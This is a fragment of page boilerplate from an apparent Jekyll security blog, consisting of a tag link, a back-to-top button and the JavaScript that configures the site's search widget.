class="post-tag" href="/tags/android-security/">Android Security</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://itsfading.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script>
